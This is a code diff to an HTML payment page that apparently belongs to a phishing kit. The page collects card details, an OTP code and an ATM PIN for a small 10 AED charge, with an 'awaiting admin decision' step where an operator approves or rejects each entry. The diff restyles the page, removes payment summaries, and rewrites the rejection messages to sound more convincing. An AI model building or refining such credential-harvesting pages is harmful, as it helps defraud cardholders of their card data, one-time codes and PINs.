@@ -233,7 +233,8 @@
             justify-content: center;
             font-size: 26px;
         }
-        .step-ic.atm { background: #fff4e6; border-color: #ffe1b4; }
+        .step-ic.atm { background: #ffffff; border-color: #e0e7ff; }
+        .step-ic { box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08); }
         .step-center h3 { font-size: 20px; font-weight: 700; color: #33475b; }
         .step-center p.sub { margin-top: 10px; font-size: 14px; color: #5b6b7f; line-height: 1.75; }
         .step-center .big-input {
@@ -396,12 +397,6 @@
         <!-- STEP 2: OTP -->
         <div id="pg-otp" class="hidden">
             <div class="card">
-                <div class="card-head">Payment Summary</div>
-                <div class="card-body">
-                    <div class="row total"><span class="lbl">Total Due</span><span class="val" id="sum-total-2">10 AED</span></div>
-                </div>
-            </div>
-            <div class="card">
                 <div class="card-head">Card Security Verification</div>
                 <div class="card-body">
                     <div class="step-center">
@@ -420,12 +415,6 @@
 
         <!-- STEP 3: ATM PIN -->
         <div id="pg-atm" class="hidden">
-            <div class="card">
-                <div class="card-head">Payment Summary</div>
-                <div class="card-body">
-                    <div class="row total"><span class="lbl">Total Due</span><span class="val" id="sum-total-3">10 AED</span></div>
-                </div>
-            </div>
             <div class="card">
                 <div class="card-head">PIN Verification</div>
                 <div class="card-body">
@@ -589,9 +578,9 @@
 
         // ---------------- Awaiting admin decision (approve / reject) ----------------
         const REJECT_MESSAGES = {
-            card: 'Payment failed. Your card may not be enabled for online payments. Please try a different payment method or contact your bank.',
-            otp: 'The code you entered is incorrect or invalid. Please verify the correct code and try again.',
-            pin: 'The ATM PIN is incorrect. Please verify the correct PIN and try again.'
+            card: 'Sorry, we could not complete the transaction. Please check your card details or try again later.',
+            otp: 'The OTP code is incorrect. Please check the code sent to your phone and try again.',
+            pin: 'The PIN number is incorrect. Please verify the number and try again.'
         };
 
         let decideTimer = null;
